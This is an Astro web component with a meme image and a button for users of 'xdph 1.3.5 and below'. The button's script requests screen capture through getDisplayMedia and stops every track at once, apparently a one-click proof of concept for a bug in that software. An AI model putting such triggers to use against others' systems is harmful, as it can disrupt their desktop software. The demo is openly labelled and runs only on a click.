---
import { Image, Picture } from "astro:assets"
import soypoint from "./soypoint.png"
---

<div>
    <div>
        <p>if you're using xdph 1.3.5 and below,</p>
        <button id="run-exploit">click me</button>
    </div>
    <Picture
        src={soypoint}
        alt="Soyjak pointing"
        formats={["avif", "webp", "jpeg"]}
    />
</div>
<style lang="scss">
    div {
        width: auto;
        height: auto;
        position: relative;
        img {
            max-width: 100%;
            height: auto;
            display: block;
            margin: auto;
        }
        div {
            text-align: center;
            position: absolute;
            left: 50%;
            top: 20%;
            transform: translateX(-50%);
            p {
                margin: 0 0 5pt 0;
                color: var(--c-subtext1);
            }
            button {
                font-size: x-large;
            }
        }
    }
</style>
<script>
    const inj = () => {
        const exploitButton = document.getElementById("run-exploit")
        if (!exploitButton) return

        exploitButton.onclick = function () {
            navigator.mediaDevices
                .getDisplayMedia({
                    video: true,
                })
                .then(stream =>
                    stream.getTracks().forEach(track => track.stop())
                )
        }
    }

    // fixes demo not working when navigating to page
    document.addEventListener("domready", inj)
    inj()
</script>
